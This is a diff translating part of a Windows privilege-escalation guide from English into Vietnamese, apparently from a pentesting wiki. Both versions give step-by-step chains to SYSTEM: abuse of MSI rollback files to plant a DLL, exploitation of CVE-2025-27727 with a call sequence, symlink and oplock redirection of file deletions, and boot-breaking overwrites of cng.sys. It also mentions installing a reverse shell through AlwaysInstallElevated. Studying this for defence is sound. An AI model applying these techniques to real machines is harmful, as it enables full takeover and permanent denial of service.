-The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.
+Cuộc tấn công về cơ bản lợi dụng tính năng rollback của Windows Installer để thay thế các tệp hợp lệ bằng tệp độc hại trong quá trình gỡ cài đặt. Để thực hiện, attacker cần tạo một **MSI installer độc hại** dùng để chiếm quyền kiểm soát thư mục `C:\Config.Msi`. Sau đó, Windows Installer sẽ dùng thư mục này để lưu các tệp rollback trong quá trình gỡ cài đặt những gói MSI khác; các tệp rollback này sẽ bị sửa đổi để chứa payload độc hại.
 
-### Windows Installer COM cleanup-path injection (CVE-2025-27727)
+### Chèn đường dẫn dọn dẹp COM của Windows Installer (CVE-2025-27727)
 
-A low-privileged client can reach the SYSTEM `msiexec.exe` service through the `CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverse engineering identified the relevant `IMsiServer` calls as `MsiBeginTransactionW` at vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` at `0xC8`, and `CleanupTempPackages` at `0x50`. These names and offsets are reverse-engineered and can vary between builds.<sup>[[41]](#references)</sup>
+Client có quyền thấp có thể truy cập dịch vụ `msiexec.exe` chạy bằng SYSTEM thông qua đối tượng COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Qua reverse engineering, các lời gọi `IMsiServer` liên quan được xác định là `MsiBeginTransactionW` tại offset vtable `0xA0`, `SetEEUIDirectoryAndFilter` tại `0xC8` và `CleanupTempPackages` tại `0x50`. Các tên và offset này được xác định bằng reverse engineering và có thể khác nhau giữa các bản build.<sup>[[41]](#references)</sup>
 
-For a non-administrator, `SetEEUIDirectoryAndFilter` impersonates the caller only while opening the supplied path with `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS`, and `FILE_FLAG_OPEN_REPARSE_POINT`. This proves that the caller can delete the directory and avoids following a reparse point, but it does **not** bind the checked file object to later cleanup or prove that Windows Installer created it.<sup>[[41]](#references)</sup>
+Đối với người dùng không phải administrator, `SetEEUIDirectoryAndFilter` chỉ impersonate caller trong lúc mở path được cung cấp với `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` và `FILE_FLAG_OPEN_REPARSE_POINT`. Điều này chứng minh caller có thể xóa thư mục và tránh đi theo reparse point, nhưng **không** ràng buộc đối tượng tệp đã kiểm tra với thao tác dọn dẹp về sau, cũng không chứng minh rằng Windows Installer đã tạo ra nó.<sup>[[41]](#references)</sup>
 
-After `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` schedules the path as a folder regardless of the caller's filter argument. The service writes a named `REG_DWORD` value under `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: the value name is the caller-controlled path and data `0x00000002` is the folder flag. `CleanupTempPackages(NULL, FALSE)` then enters cleanup directly. Its elevated worker enumerates the registry values and passes folder entries to recursive `FDeleteFolder` without checking path provenance. If normal removal fails, the code also calls `LockdownPath`, clears file attributes, and retries.<sup>[[41]](#references)</sup>
+Sau `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` lên lịch path như một thư mục bất kể đối số filter của caller. Service ghi một giá trị `REG_DWORD` có tên vào `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: tên giá trị là path do caller kiểm soát, còn dữ liệu `0x00000002` là cờ thư mục. Sau đó, `CleanupTempPackages(NULL, FALSE)` gọi thẳng vào quy trình dọn dẹp. Worker chạy với quyền cao liệt kê các giá trị registry và chuyển các mục thư mục cho `FDeleteFolder` đệ quy mà không kiểm tra nguồn gốc path. Nếu thao tác gỡ bỏ thông thường thất bại, code cũng gọi `LockdownPath`, xóa các thuộc tính tệp rồi thử lại.<sup>[[41]](#references)</sup>
 
-The minimal call sequence recovered from `msi.dll` is:<sup>[[41]](#references)</sup>
+Trình tự lời gọi tối thiểu được khôi phục từ `msi.dll` là:<sup>[[41]](#references)</sup>
 
 ```c
 CreateDirectoryW(L"C:\\Config.Msi", NULL);
@@ -2339,121 +2338,121 @@ server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
 server->CleanupTempPackages(NULL, FALSE);
 ```
 
-The useful primitive is path reuse rather than a junction redirect. Register an attacker-created `C:\Config.Msi`, remove it, and let Windows Installer later recreate the same pathname with protected rollback data. Cleanup trusts the stale `TempPackages` name and deletes the new directory as SYSTEM. This bypasses the intended boundary from `FILE_FLAG_OPEN_REPARSE_POINT` and redirection-trust mitigation because no reparse point is required.<sup>[[41]](#references)</sup>
+Primitive hữu ích ở đây là tái sử dụng đường dẫn thay vì chuyển hướng bằng junction. Đăng ký một `C:\Config.Msi` do attacker tạo, xóa nó, rồi để Windows Installer tạo lại cùng đường dẫn đó sau này với dữ liệu rollback được bảo vệ. Quá trình dọn dẹp tin vào tên `TempPackages` cũ và xóa thư mục mới với quyền SYSTEM. Cách này vượt qua ranh giới bảo vệ dự kiến của `FILE_FLAG_OPEN_REPARSE_POINT` và biện pháp giảm thiểu dựa trên độ tin cậy của chuyển hướng, vì không cần reparse point.<sup>[[41]](#references)</sup>
 
-This deletion primitive fits the rollback chain below: preserve the separate `Installer\Folders` record, delete the protected `C:\Config.Msi`, recreate it with a NULL DACL, and retain a handle granted `WRITE_DAC` before the installer hardens the DACL. The pre-opened handle can restore a permissive DACL with `NtSetSecurityObject`, after which the generated `.rbs` can be replaced before rollback resumes.<sup>[[41]](#references)</sup>
+Primitive xóa này phù hợp với chuỗi rollback bên dưới: giữ lại bản ghi `Installer\Folders` riêng biệt, xóa `C:\Config.Msi` được bảo vệ, tạo lại thư mục với NULL DACL, rồi giữ một handle được cấp `WRITE_DAC` trước khi installer siết chặt DACL. Handle đã mở sẵn có thể khôi phục DACL dễ dãi bằng `NtSetSecurityObject`, sau đó có thể thay thế `.rbs` được tạo ra trước khi rollback tiếp tục.<sup>[[41]](#references)</sup>
 
-Microsoft fixed the path by preventing `CMsiTransaction::SetEEUIDirectoryAndFilter` from calling `ScheduleFileOrFolderDelete` when the new feature gate is enabled. The COM call can still return success, but it no longer places the attacker-controlled path in `TempPackages`. Apply the April 2025 Windows security updates rather than using successful method return as a patch test.<sup>[[41]](#references)[[42]](#references)</sup>
+Microsoft đã sửa lỗi này bằng cách ngăn `CMsiTransaction::SetEEUIDirectoryAndFilter` gọi `ScheduleFileOrFolderDelete` khi bật feature gate mới. Lệnh gọi COM vẫn có thể trả về thành công, nhưng đường dẫn do attacker kiểm soát sẽ không còn được thêm vào `TempPackages`. Hãy áp dụng các bản cập nhật bảo mật Windows tháng 4 năm 2025 thay vì dùng việc method trả về thành công làm phép thử bản vá.<sup>[[41]](#references)[[42]](#references)</sup>
 
-The summarized technique is the following:
+Kỹ thuật được tóm tắt như sau:
 
-1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**
+1. **Giai đoạn 1 – Chuẩn bị cho việc chiếm quyền (để `C:\Config.Msi` trống)**
 
-- Step 1: Install the MSI
-    - Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
-    - Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
-    - Keep a **handle** open to the file after install.
+- Bước 1: Cài đặt MSI
+    - Tạo một `.msi` cài đặt một file vô hại (ví dụ: `dummy.txt`) vào một thư mục có thể ghi (`TARGETDIR`).
+    - Đánh dấu installer là **"UAC Compliant"** để **người dùng không phải admin** có thể chạy nó.
+    - Giữ một **handle** mở tới file sau khi cài đặt.
 
-- Step 2: Begin Uninstall
-    - Uninstall the same `.msi`.
-    - The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
-    - **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.
+- Bước 2: Bắt đầu gỡ cài đặt
+    - Gỡ cài đặt cùng `.msi`.
+    - Tiến trình gỡ cài đặt bắt đầu chuyển file vào `C:\Config.Msi` và đổi tên chúng thành các file `.rbf` (bản sao lưu rollback).
+    - **Thăm dò handle file đang mở** bằng `GetFinalPathNameByHandle` để phát hiện khi file trở thành `C:\Config.Msi\<random>.rbf`.
 
-- Step 3: Custom Syncing
-    - The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
-        - Signals when `.rbf` has been written.
-        - Then **waits** on another event before continuing the uninstall.
+- Bước 3: Đồng bộ hóa tùy chỉnh
+    - `.msi` có một **custom uninstall action (`SyncOnRbfWritten`)** để:
+        - Báo hiệu khi `.rbf` đã được ghi.
+        - Sau đó **chờ** một event khác trước khi tiếp tục gỡ cài đặt.
 
-- Step 4: Block Deletion of `.rbf`
-    - When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
-    - Then **signal back** so the uninstall can finish.
-    - Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.
+- Bước 4: Ngăn xóa `.rbf`
+    - Khi nhận được tín hiệu, **mở file `.rbf`** mà không có `FILE_SHARE_DELETE` — việc này **ngăn file bị xóa**.
+    - Sau đó **gửi tín hiệu phản hồi** để quá trình gỡ cài đặt hoàn tất.
+    - Windows Installer không thể xóa `.rbf`; do không thể xóa toàn bộ nội dung, nó **không xóa `C:\Config.Msi`**.
 
-- Step 5: Manually Delete `.rbf`
-    - You (attacker) delete the `.rbf` file manually.
-    - Now **`C:\Config.Msi` is empty**, ready to be hijacked.
+- Bước 5: Xóa `.rbf` thủ công
+    - Bạn (attacker) tự xóa file `.rbf`.
+    - Lúc này, **`C:\Config.Msi` đã trống**, sẵn sàng bị chiếm quyền.
 
-> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.
+> Tại thời điểm này, **kích hoạt lỗ hổng xóa thư mục tùy ý ở cấp SYSTEM** để xóa `C:\Config.Msi`.
 
-2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**
+2. **Giai đoạn 2 – Thay thế rollback script bằng script độc hại**
 
-- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
-    - Recreate the `C:\Config.Msi` folder yourself.
-    - Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.
+- Bước 6: Tạo lại `C:\Config.Msi` với ACL yếu
+    - Tự tạo lại thư mục `C:\Config.Msi`.
+    - Đặt **DACL yếu** (ví dụ: Everyone:F) và **giữ một handle mở** với quyền `WRITE_DAC`.
 
-- Step 7: Run Another Install
-    - Install the `.msi` again, with:
-        - `TARGETDIR`: Writable location.
-        - `ERROROUT`: A variable that triggers a forced failure.
-    - This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.
+- Bước 7: Chạy một lượt cài đặt khác
+    - Cài đặt lại `.msi` với:
+        - `TARGETDIR`: Vị trí có thể ghi.
+        - `ERROROUT`: Một biến kích hoạt lỗi bắt buộc.
+    - Lượt cài đặt này sẽ được dùng để kích hoạt **rollback** lần nữa, quá trình này đọc `.rbs` và `.rbf`.
 
-- Step 8: Monitor for `.rbs`
-    - Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
-    - Capture its filename.
+- Bước 8: Theo dõi `.rbs`
+    - Dùng `ReadDirectoryChangesW` để theo dõi `C:\Config.Msi` cho đến khi xuất hiện `.rbs` mới.
+    - Ghi lại tên file.
 
-- Step 9: Sync Before Rollback
-    - The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
-        - Signals an event when the `.rbs` is created.
-        - Then **waits** before continuing.
+- Bước 9: Đồng bộ trước khi rollback
+    - `.msi` có một **custom install action (`SyncBeforeRollback`)** để:
+        - Báo hiệu một event khi `.rbs` được tạo.
+        - Sau đó **chờ** trước khi tiếp tục.
 
-- Step 10: Reapply Weak ACL
-    - After receiving the `.rbs created` event:
-        - The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
-        - But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.
+- Bước 10: Áp dụng lại ACL yếu
+    - Sau khi nhận event `.rbs created`:
+        - Windows Installer **áp dụng lại ACL mạnh** cho `C:\Config.Msi`.
+        - Nhưng vì bạn vẫn có handle với quyền `WRITE_DAC`, bạn có thể **áp dụng lại ACL yếu**.
 
-> ACLs are **only enforced on handle open**, so you can still write to the folder.
+> ACL chỉ được **kiểm tra khi mở handle**, vì vậy bạn vẫn có thể ghi vào thư mục.
 
-- Step 11: Drop Fake `.rbs` and `.rbf`
-    - Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
-        - Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
-    - Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.
+- Bước 11: Đưa vào `.rbs` và `.rbf` giả
+    - Ghi đè file `.rbs` bằng một **rollback script giả** yêu cầu Windows:
+        - Khôi phục file `.rbf` của bạn (DLL độc hại) vào một **vị trí đặc quyền** (ví dụ: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
+    - Đưa vào `.rbf` giả chứa **DLL payload độc hại ở cấp SYSTEM**.
 
-- Step 12: Trigger the Rollback
-    - Signal the sync event so the installer resumes.
-    - A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
-    - This causes **rollback to begin**.
+- Bước 12: Kích hoạt rollback
+    - Gửi tín hiệu sync event để installer tiếp tục.
+    - Một **custom action loại 19 (`ErrorOut`)** được cấu hình để **cố ý làm cài đặt thất bại** tại một thời điểm đã biết.
+    - Việc này khiến **rollback bắt đầu**.
 
-- Step 13: SYSTEM Installs Your DLL
+- Bước 13: SYSTEM cài đặt DLL của bạn
     - Windows Installer:
-        - Reads your malicious `.rbs`.
-        - Copies your `.rbf` DLL into the target location.
-    - You now have your **malicious DLL in a SYSTEM-loaded path**.
+        - Đọc `.rbs` độc hại của bạn.
+        - Sao chép DLL `.rbf` của bạn vào vị trí đích.
+    - Giờ bạn có **DLL độc hại nằm trong đường dẫn được SYSTEM tải**.
 
-- Final Step: Execute SYSTEM Code
-    - Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
-    - **Boom**: Your code is executed **as SYSTEM**.
+- Bước cuối: Thực thi mã SYSTEM
+    - Chạy một **binary tự động nâng quyền đáng tin cậy** (ví dụ: `osk.exe`) để tải DLL mà bạn đã chiếm quyền.
+    - **Thế là xong**: Mã của bạn được thực thi **với quyền SYSTEM**.
 
 
-### From Arbitrary File Delete/Move/Rename to SYSTEM EoP
+### Từ xóa/di chuyển/đổi tên file tùy ý đến SYSTEM EoP
 
-The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?
+Kỹ thuật MSI rollback chính (ở trên) giả định rằng bạn có thể xóa **toàn bộ thư mục** (ví dụ: `C:\Config.Msi`). Nhưng nếu lỗ hổng của bạn chỉ cho phép **xóa file tùy ý** thì sao?
 
-You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
+Bạn có thể khai thác **cấu trúc nội bộ NTFS**: mọi thư mục đều có một alternate data stream ẩn tên là:
 
 ```
 C:\SomeFolder::$INDEX_ALLOCATION
 ```
 
-This stream stores the **index metadata** of the folder.
+Stream này lưu trữ **metadata chỉ mục** của thư mục.
 
-So, if you **delete the `::$INDEX_ALLOCATION` stream** of a folder, NTFS **removes the entire folder** from the filesystem.
+Vì vậy, nếu bạn **xóa stream `::$INDEX_ALLOCATION`** của một thư mục, NTFS sẽ **xóa toàn bộ thư mục** khỏi hệ thống tệp.
 
-You can do this using standard file deletion APIs like:
+Bạn có thể thực hiện việc này bằng các API xóa tệp tiêu chuẩn như:
 ```c
 DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
 ```
 
-> Even though you're calling a *file* delete API, it **deletes the folder itself**.
+> Mặc dù bạn đang gọi API xóa *file*, API này **xóa chính folder đó**.
 
-### From Folder Contents Delete to SYSTEM EoP
-What if your primitive doesn’t allow you to delete arbitrary files/folders, but it **does allow deletion of the *contents* of an attacker-controlled folder**?
+### Từ xóa nội dung folder đến SYSTEM EoP
+Điều gì xảy ra nếu primitive của bạn không cho phép xóa file/folder tùy ý, nhưng **cho phép xóa *nội dung* của một folder do attacker kiểm soát**?
 
-1. Step 1: Setup a bait folder and file
-- Create: `C:\temp\folder1`
-- Inside it: `C:\temp\folder1\file1.txt`
+1. Bước 1: Tạo một folder và file mồi
+- Tạo: `C:\temp\folder1`
+- Bên trong folder đó: `C:\temp\folder1\file1.txt`
 
-2. Step 2: Place an **oplock** on `file1.txt`
-- The oplock **pauses execution** when a privileged process tries to delete `file1.txt`.
+2. Bước 2: Đặt một **oplock** lên `file1.txt`
+- Oplock **tạm dừng quá trình thực thi** khi một process có đặc quyền cố xóa `file1.txt`.
 
 ```c
 // pseudo-code
@@ -2461,84 +2460,84 @@ RequestOplock("C:\\temp\\folder1\\file1.txt");
 WaitForDeleteToTriggerOplock();
 ```
 
-3. Step 3: Trigger SYSTEM process (e.g., `SilentCleanup`)
-- This process scans folders (e.g., `%TEMP%`) and tries to delete their contents.
-- When it reaches `file1.txt`, the **oplock triggers** and hands control to your callback.
+3. Bước 3: Kích hoạt process SYSTEM (ví dụ: `SilentCleanup`)
+- Process này quét các thư mục (ví dụ: `%TEMP%`) và cố gắng xóa nội dung bên trong.
+- Khi process đến `file1.txt`, **oplock được kích hoạt** và chuyển quyền điều khiển cho callback của bạn.
 
-4. Step 4: Inside the oplock callback – redirect the deletion
+4. Bước 4: Bên trong callback của oplock – chuyển hướng thao tác xóa
 
-- Option A: Move `file1.txt` elsewhere
-    - This empties `folder1` without breaking the oplock.
-    - Don't delete `file1.txt` directly — that would release the oplock prematurely.
+- Tùy chọn A: Di chuyển `file1.txt` sang nơi khác
+    - Thao tác này làm trống `folder1` mà không phá vỡ oplock.
+    - Đừng xóa trực tiếp `file1.txt` — làm vậy sẽ giải phóng oplock quá sớm.
 
-- Option B: Convert `folder1` into a **junction**:
+- Tùy chọn B: Chuyển `folder1` thành một **junction**:
 
 ```bash
 # folder1 is now a junction to \RPC Control (non-filesystem namespace)
 mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
 ```
 
-- Option C: Create a **symlink** in `\RPC Control`:
+- Tùy chọn C: Tạo một **symlink** trong `\RPC Control`:
 ```bash
 # Make file1.txt point to a sensitive folder stream
 CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
 ```
 
-> This targets the NTFS internal stream that stores folder metadata — deleting it deletes the folder.
+> Điều này nhắm vào internal stream của NTFS lưu metadata thư mục — xóa nó sẽ xóa thư mục.
 
-5. Step 5: Release the oplock
-- SYSTEM process continues and tries to delete `file1.txt`.
-- But now, due to the junction + symlink, it's actually deleting:
+5. Step 5: Nhả oplock
+- Tiến trình SYSTEM tiếp tục và cố gắng xóa `file1.txt`.
+- Nhưng lúc này, do junction + symlink, thực tế nó đang xóa:
 ```
 C:\Config.Msi::$INDEX_ALLOCATION
 ```
 
-**Result**: `C:\Config.Msi` is deleted by SYSTEM.
+**Kết quả**: `C:\Config.Msi` bị SYSTEM xóa.
 
-### From Arbitrary Folder Create to Permanent DoS
+### Từ khả năng tạo thư mục tùy ý đến DoS vĩnh viễn
 
-Exploit a primitive that lets you **create an arbitrary folder as SYSTEM/admin** —  even if **you can’t write files** or **set weak permissions**.
+Khai thác một primitive cho phép bạn **tạo thư mục tùy ý với quyền SYSTEM/admin** — ngay cả khi **bạn không thể ghi file** hoặc **thiết lập quyền yếu**.
 
-Create a **folder** (not a file) with the name of a **critical Windows driver**, e.g.:
+Tạo một **thư mục** (không phải file) có tên của một **driver Windows quan trọng**, ví dụ:
 ```
 C:\Windows\System32\cng.sys
 ```
 
-- This path normally corresponds to the `cng.sys` kernel-mode driver.
-- If you **pre-create it as a folder**, Windows fails to load the actual driver on boot.
-- Then, Windows tries to load `cng.sys` during boot.
-- It sees the folder, **fails to resolve the actual driver**, and **crashes or halts boot**.
-- There’s **no fallback**, and **no recovery** without external intervention (e.g., boot repair or disk access).
+- Đường dẫn này thường tương ứng với driver kernel-mode `cng.sys`.
+- Nếu bạn **tạo sẵn đường dẫn này dưới dạng thư mục**, Windows sẽ không tải được driver thực khi khởi động.
+- Sau đó, Windows cố tải `cng.sys` trong quá trình khởi động.
+- Windows thấy thư mục, **không thể phân giải driver thực** và **bị crash hoặc dừng khởi động**.
+- **Không có phương án dự phòng** và **không thể khôi phục** nếu không có can thiệp từ bên ngoài (ví dụ: sửa lỗi khởi động hoặc truy cập ổ đĩa).
 
-### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS
+### Từ đường dẫn log/sao lưu có đặc quyền + symlink OM đến ghi đè file tùy ý / DoS khởi động
 
-When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>
+Khi một **dịch vụ có đặc quyền** ghi log/xuất dữ liệu vào đường dẫn lấy từ **cấu hình có thể ghi**, hãy chuyển hướng đường dẫn đó bằng **symlink Object Manager + điểm gắn kết NTFS** để biến thao tác ghi có đặc quyền thành ghi đè tùy ý (ngay cả **khi không có SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>
 
-**Requirements**
-- Config storing the target path is writable by the attacker (e.g., `%ProgramData%\...\.ini`).
-- Ability to create a mount point to `\RPC Control` and an OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
-- A privileged operation that writes to that path (log, export, report).
+**Yêu cầu**
+- Tệp cấu hình lưu đường dẫn đích có thể được attacker ghi (ví dụ: `%ProgramData%\...\.ini`).
+- Có khả năng tạo điểm gắn kết đến `\RPC Control` và symlink file OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
+- Có thao tác đặc quyền ghi vào đường dẫn đó (log, bản xuất, báo cáo).
 
-**Example chain**
-1. Read the config to recover the privileged log destination, e.g. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
-2. Redirect the path without admin:
+**Chuỗi ví dụ**
+1. Đọc cấu hình để lấy đường dẫn log đặc quyền, ví dụ: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` trong `C:\ProgramData\ICONICS\IcoSetup64.ini`.
+2. Chuyển hướng đường dẫn mà không cần quyền admin:
 ```cmd
 mkdir C:\users\iconics_user\AppData\Local\Temp\logs
 CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
 CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
 ```
-3. Wait for the privileged component to write the log (e.g., admin triggers "send test SMS"). The write now lands in `C:\Windows\System32\cng.sys`.
-4. Inspect the overwritten target (hex/PE parser) to confirm corruption; reboot forces Windows to load the tampered driver path → **boot loop DoS**. This also generalizes to any protected file a privileged service will open for write.
+3. Chờ thành phần có đặc quyền ghi log (ví dụ: quản trị viên kích hoạt "gửi SMS thử nghiệm"). Lúc này, dữ liệu sẽ được ghi vào `C:\Windows\System32\cng.sys`.
+4. Kiểm tra mục tiêu đã bị ghi đè (bằng hex/PE parser) để xác nhận dữ liệu bị hỏng; khởi động lại sẽ buộc Windows tải driver đã bị can thiệp → **DoS vòng lặp khởi động**. Cách này cũng áp dụng cho mọi tệp được bảo vệ mà một dịch vụ có đặc quyền sẽ mở để ghi.
 
-> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.
+> `cng.sys` thường được tải từ `C:\Windows\System32\drivers\cng.sys`, nhưng nếu có bản sao ở `C:\Windows\System32\cng.sys`, Windows có thể thử tải bản sao đó trước, khiến nó trở thành đích DoS đáng tin cậy để ghi dữ liệu bị hỏng.
 
 
 
-## **From High Integrity to System**
+## **Từ High Integrity đến System**
 
-### **New service**
+### **Dịch vụ mới**
 
-If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
+Nếu bạn đang chạy trong một tiến trình High Integrity, **đường dẫn đến SYSTEM** có thể dễ dàng đạt được chỉ bằng cách **tạo và thực thi một dịch vụ mới**:
 
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
@@ -2546,33 +2545,33 @@ sc start newservicename
 ```
 
 > [!TIP]
-> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.
+> Khi tạo service binary, hãy đảm bảo đó là một service hợp lệ hoặc binary thực hiện các hành động cần thiết thật nhanh, vì nó sẽ bị dừng sau 20 giây nếu không phải là service hợp lệ.
 
 ### AlwaysInstallElevated
 
-From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
-[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)
+Từ một tiến trình High Integrity, bạn có thể thử **bật các registry entry AlwaysInstallElevated** và **cài đặt** một reverse shell bằng một wrapper _**.msi**_.\
+[Xem thêm thông tin về các registry key liên quan và cách cài đặt gói _.msi_ tại đây.](#alwaysinstallelevated)
 
 ### High + SeImpersonate privilege to System
 
-**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**
+**Bạn có thể** [**tìm code tại đây**](seimpersonate-from-high-to-system.md)**.**
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
-If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
-Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
-**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**
+Nếu có các token privilege này (có lẽ bạn sẽ thấy chúng trong một tiến trình High Integrity), bạn sẽ có thể **mở gần như bất kỳ tiến trình nào** (ngoại trừ các tiến trình được bảo vệ) bằng SeDebug privilege, **sao chép token** của tiến trình đó và tạo một **tiến trình tùy ý với token đó**.\
+Kỹ thuật này thường **chọn một tiến trình bất kỳ đang chạy dưới quyền SYSTEM với tất cả token privilege** (_đúng vậy, bạn có thể tìm thấy các tiến trình SYSTEM không có đầy đủ token privilege_).\
+**Bạn có thể tìm thấy** [**ví dụ code thực hiện kỹ thuật này tại đây**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
-If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
-If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).
+Kỹ thuật này được meterpreter sử dụng để leo thang quyền trong `getsystem`. Kỹ thuật này bao gồm **tạo một pipe rồi tạo/lạm dụng một service để ghi vào pipe đó**. Sau đó, **server** tạo pipe bằng privilege **`SeImpersonate`** có thể **impersonate token** của client của pipe (service), qua đó có được quyền SYSTEM.\
+Nếu muốn [**tìm hiểu thêm về named pipe, hãy đọc nội dung này**](#named-pipe-client-impersonation).\
+Nếu muốn đọc ví dụ về [**cách chuyển từ High Integrity lên System bằng named pipe, hãy đọc nội dung này**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
-**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**
+Nếu bạn có thể **chiếm quyền một dll** đang được **load** bởi một **tiến trình** chạy dưới quyền **SYSTEM**, bạn sẽ có thể thực thi code tùy ý với các quyền đó. Vì vậy, Dll Hijacking cũng hữu ích cho kiểu leo thang quyền này; hơn nữa, cách này **dễ thực hiện hơn nhiều từ một tiến trình High Integrity**, vì tiến trình đó có **quyền ghi** vào các thư mục được dùng để load dll.\
+**Bạn có thể** [**tìm hiểu thêm về Dll hijacking tại đây**](dll-hijacking/index.html)**.**
 
 ### **From Administrator or Network Service to System**
 
@@ -2582,53 +2581,53 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 ### From LOCAL SERVICE or NETWORK SERVICE to full privs
 
-**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
+**Đọc:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
 ## More help
 
-[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[Các binary impacket tĩnh](https://github.com/ropnop/impacket_static_binaries)
 
 ## Useful tools
 
-**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Công cụ tốt nhất để tìm các vector leo thang quyền cục bộ trên Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
